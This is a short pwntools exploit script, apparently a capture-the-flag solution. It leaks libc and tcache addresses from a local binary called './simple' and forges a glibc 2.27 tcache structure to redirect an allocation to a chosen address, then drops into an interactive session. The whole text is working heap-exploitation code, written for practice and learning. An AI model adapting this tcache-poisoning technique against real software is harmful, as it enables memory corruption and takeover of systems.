from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

binary = './simple'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)

r = process(binary)

r.recvuntil('0x')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['printf']
print("libc_base @ ", hex(libc_base))

r.recvuntil('0x')
my_tcache = int(r.recvline().strip(), 16)
print("my_tcache @ ", hex(my_tcache))

tcache_ptr = libc_base + 0x6094b0 # 2.27
print("tcache_ptr @ ", hex(tcache_ptr))





r.sendlineafter(':', str(tcache_ptr))
r.sendlineafter(':', str(my_tcache))
tcache = flat(1).ljust(0x40, b'\0') + flat(0x601800)
r.sendlineafter(':', tcache)


r.interactive()
